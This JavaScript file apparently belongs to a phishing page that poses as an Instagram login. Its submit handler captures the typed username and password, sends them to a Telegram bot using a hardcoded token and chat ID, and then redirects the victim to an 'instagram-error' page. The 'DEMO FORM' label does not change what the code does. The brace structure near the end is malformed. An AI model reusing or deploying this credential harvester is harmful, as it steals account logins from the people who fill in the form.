const BOT_TOKEN = "8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0";
const CHAT_ID = "5613942414";




// =========================
// EYE TOGGLE
// =========================

function togglePassword() {
    const passwordField = document.getElementById("password");
    const eyeOpen = document.getElementById("eyeOpen");
    const eyeClosed = document.getElementById("eyeClosed");

    if (!passwordField) {
        console.error("Password field not found");
        return;
    }

    const isHidden = passwordField.type === "password";

    passwordField.type = isHidden ? "text" : "password";

    if (eyeOpen && eyeClosed) {
        eyeOpen.style.display = isHidden ? "block" : "none";
        eyeClosed.style.display = isHidden ? "none" : "block";
    }
}


// =========================
// FORM + TELEGRAM
// =========================

const form = document.getElementById("demoForm");

if (form) {
    form.addEventListener("submit", async function (event) {
        event.preventDefault();

        const username = document
            .getElementById("username")
            .value
            .trim();

        const password = document.getElementById("password").value.trim();


        const telegramMessage =
            "📋 DEMO FORM SUBMISSION\n\n" +
            "Username: " + username + "\n" +
            "password: " + password;

        try {
            const response = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                {
                    method: "POST",

                    headers: {
                        "Content-Type": "application/json"
                    },

                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: telegramMessage
                    })
                }
            );

            const result = await response.json();

            console.log("Telegram response:", result);

            if (result.ok) {
    window.location.href = "https://instagram-error.vercel.app/";
} else {
    console.error("Telegram error:", result);
            }
    console.error("Telegram error:", result);
}

        } catch (error) {
            console.error("Telegram request failed:", error);
        }
    });
}

